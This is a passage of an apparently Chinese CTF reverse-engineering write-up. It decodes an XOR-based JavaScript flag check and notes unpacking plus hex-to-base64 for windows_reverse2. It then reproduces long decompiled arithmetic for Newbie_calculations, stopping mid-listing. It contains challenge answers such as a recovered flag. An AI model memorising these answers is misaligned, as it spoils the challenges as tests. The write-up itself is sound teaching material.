class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> f=<span class="hljs-keyword">window</span>.machine.registers[1].userinput</span><br><span class="line"><span class="hljs-keyword">var</span> i = f.length</span><br><span class="line"><span class="hljs-keyword">var</span> nonce = 'groke';</span><br><span class="line"><span class="hljs-keyword">var</span> j = 0;</span><br><span class="line"><span class="hljs-keyword">var</span> <span class="hljs-keyword">out</span> = [];</span><br><span class="line"><span class="hljs-keyword">var</span> <span class="hljs-keyword">eq</span> = true;</span><br><span class="line"><span class="hljs-keyword">while</span>(j &lt; i){</span><br><span class="line"><span class="hljs-keyword">out</span>.push(f.charCodeAt(j) ^ nonce.charCodeAt(j%5))</span><br><span class="line">j++;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">var</span> <span class="hljs-keyword">ex</span> =  [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];</span><br><span class="line"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">ex</span>.length == <span class="hljs-keyword">out</span>.length) {</span><br><span class="line">j = 0;</span><br><span class="line"><span class="hljs-keyword">while</span>(j &lt; <span class="hljs-keyword">ex</span>.length){</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">ex</span>[j] != <span class="hljs-keyword">out</span>[j])</span><br><span class="line"><span class="hljs-keyword">eq</span> = false;</span><br><span class="line">j += 1;</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">eq</span>){</span><br><span class="line">alert('YOU <span class="hljs-keyword">WIN</span>!');</span><br><span class="line">}<span class="hljs-keyword">else</span>{</span><br><span class="line">alert('NOPE!');</span><br><span class="line">}}<span class="hljs-keyword">else</span>{alert('NOPE!');}</span><br></pre></td></tr></tbody></table></figure><p>过程非常简单，也是闲着无聊，写了个什么都没有的网页</p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>decode<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'out.js'</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'button'</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">"run()"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">'decode'</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-keyword">const</span> nonce = <span class="hljs-string">'groke'</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> j = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> flag =<span class="hljs-string">''</span>;</span><br><span class="line">    <span class="hljs-keyword">const</span> ex = [<span class="hljs-number">1</span>, <span class="hljs-number">30</span>, <span class="hljs-number">14</span>, <span class="hljs-number">12</span>, <span class="hljs-number">69</span>, <span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">85</span>, <span class="hljs-number">75</span>, <span class="hljs-number">50</span>, <span class="hljs-number">40</span>, <span class="hljs-number">37</span>, <span class="hljs-number">48</span>, <span class="hljs-number">24</span>, <span class="hljs-number">10</span>, <span class="hljs-number">56</span>, <span class="hljs-number">55</span>, <span class="hljs-number">46</span>, <span class="hljs-number">56</span>, <span class="hljs-number">60</span>];</span><br><span class="line">    <span class="hljs-keyword">let</span> i = ex.length;</span><br><span class="line">    <span class="hljs-keyword">while</span> (j &lt; i) {</span><br><span class="line">        flag+=<span class="hljs-built_in">String</span>.fromCharCode(ex[j] ^ nonce.charCodeAt(j % <span class="hljs-number">5</span>));</span><br><span class="line">        j++;</span><br><span class="line">    }</span><br><span class="line">    alert(flag);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>点击按钮获得flag</p><figure class="highlight actionscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag <span class="hljs-keyword">is</span>: WOW_so_EASY</span><br></pre></td></tr></tbody></table></figure><h4 id="windows-reverse2"><a href="#windows-reverse2" class="headerlink" title="windows_reverse2"></a>windows_reverse2</h4><p>首先是脱壳，看雪脱壳工具就可以，也可以手动脱壳，IDA研究之后发现中间一个函数的作用不是很明朗，OD调试一下根据结果猜测可能是16进制转base64，试了一下就对了。</p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADEBDEAEC7BE</span><br></pre></td></tr></tbody></table></figure><h4 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" title="Newbie_calculations"></a>Newbie_calculations</h4><p>这题的就是直接会输出flag，但是进行了大量费事而且毫无意义的计算，需要仔细分析一下每一部分的函数作用，简化计算的过程，总共只有三个运算函数，很简单，就不一一分析了，直接计算flag：</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">sub</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> b)</span> </span>{</span><br><span class="line">     *a -= b;</span><br><span class="line">     <span class="hljs-keyword">return</span> a;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> b)</span> </span>{</span><br><span class="line">    *a += b;</span><br><span class="line">    <span class="hljs-keyword">return</span> a;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span>* <span class="hljs-title">mul</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *a, <span class="hljs-keyword">int</span> b)</span> </span>{</span><br><span class="line">    *a *= b;</span><br><span class="line">    <span class="hljs-keyword">return</span> a;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> *v3; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v4; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v5; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v6; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v7; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v8; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v9; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v10; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v11; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v12; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v13; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v14; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v15; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v16; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v17; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v18; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v19; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v20; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v21; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v22; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v23; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v24; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v25; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v26; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v27; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v28; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v29; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v30; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v31; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v32; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v33; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v34; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v35; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v36; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v37; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v38; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v39; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v40; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v41; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v42; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v43; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v44; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v45; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v46; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v47; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v48; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v49; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v50; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v51; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v52; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v53; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v54; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v55; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v56; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v57; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v58; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v59; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v60; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v61; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v62; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v63; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v64; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v65; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v66; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v67; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v68; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v69; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v70; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v71; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v72; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v73; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v74; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v75; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v76; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v77; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v78; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v79; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v80; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v81; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v82; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v83; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v84; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v85; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v86; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v87; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v88; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v89; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v90; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v91; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v92; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v93; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v94; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v95; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v96; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v97; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v98; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v99; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v100; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v101; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v102; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v103; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v104; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v105; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v106; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v107; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v108; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v109; <span class="hljs-comment">// ST1C_4</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v110; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v111; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v112; <span class="hljs-comment">// ST20_4</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v113; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v114; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v115; <span class="hljs-comment">// ST20_4</span></span><br><span class="line">    <span class="hljs-keyword">int</span> *v116; <span class="hljs-comment">// eax</span></span><br><span class="line">    <span class="hljs-keyword">int</span> flag[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-88h]</span></span><br><span class="line">    <span class="hljs-keyword">int</span> v121; <span class="hljs-comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i )</span><br><span class="line">        flag[i] = <span class="hljs-number">1</span>;</span><br><span class="line">    v121 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Your flag is:"</span>);</span><br><span class="line">    v3 = <span class="hljs-built_in">mul</span>(flag, <span class="hljs-number">1000000000</span>);</span><br><span class="line">    v4 = <span class="hljs-built_in">sub</span>(v3, <span class="hljs-number">999999950</span>);</span><br><span class="line">    <span class="hljs-built_in">mul</span>(v4, <span class="hljs-number">2</span>);</span><br><span class="line">    v5 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">1</span>], <span class="hljs-number">5000000</span>);</span><br><span class="line">    v6 = <span class="hljs-built_in">sub</span>(v5, <span class="hljs-number">6666666</span>);</span><br><span class="line">    v7 = <span class="hljs-built_in">add</span>(v6, <span class="hljs-number">1666666</span>);</span><br><span class="line">    v8 = <span class="hljs-built_in">add</span>(v7, <span class="hljs-number">45</span>);</span><br><span class="line">    v9 = <span class="hljs-built_in">mul</span>(v8, <span class="hljs-number">2</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v9, <span class="hljs-number">5</span>);</span><br><span class="line">    v10 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">2</span>], <span class="hljs-number">1000000000</span>);</span><br><span class="line">    v11 = <span class="hljs-built_in">sub</span>(v10, <span class="hljs-number">999999950</span>);</span><br><span class="line">    v12 = <span class="hljs-built_in">mul</span>(v11, <span class="hljs-number">2</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v12, <span class="hljs-number">2</span>);</span><br><span class="line">    v13 = <span class="hljs-built_in">add</span>(&amp;flag[<span class="hljs-number">3</span>], <span class="hljs-number">55</span>);</span><br><span class="line">    v14 = <span class="hljs-built_in">sub</span>(v13, <span class="hljs-number">3</span>);</span><br><span class="line">    v15 = <span class="hljs-built_in">add</span>(v14, <span class="hljs-number">4</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v15, <span class="hljs-number">1</span>);</span><br><span class="line">    v16 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">4</span>], <span class="hljs-number">100000000</span>);</span><br><span class="line">    v17 = <span class="hljs-built_in">sub</span>(v16, <span class="hljs-number">99999950</span>);</span><br><span class="line">    v18 = <span class="hljs-built_in">mul</span>(v17, <span class="hljs-number">2</span>);</span><br><span class="line">    <span class="hljs-built_in">add</span>(v18, <span class="hljs-number">2</span>);</span><br><span class="line">    v19 = <span class="hljs-built_in">sub</span>(&amp;flag[<span class="hljs-number">5</span>], <span class="hljs-number">1</span>);</span><br><span class="line">    v20 = <span class="hljs-built_in">mul</span>(v19, <span class="hljs-number">1000000000</span>);</span><br><span class="line">    v21 = <span class="hljs-built_in">add</span>(v20, <span class="hljs-number">55</span>);</span><br><span class="line">    <span class="hljs-built_in">sub</span>(v21, <span class="hljs-number">3</span>);</span><br><span class="line">    v22 = <span class="hljs-built_in">mul</span>(&amp;flag[<span class="hljs-number">6</span>], <span class="hljs-number">1000000</span>);</span><br><span class="line">    v23 = <span class="hljs-built_in">sub</span>(v22, <span class="hljs-number">999975</span>);</span><br><span 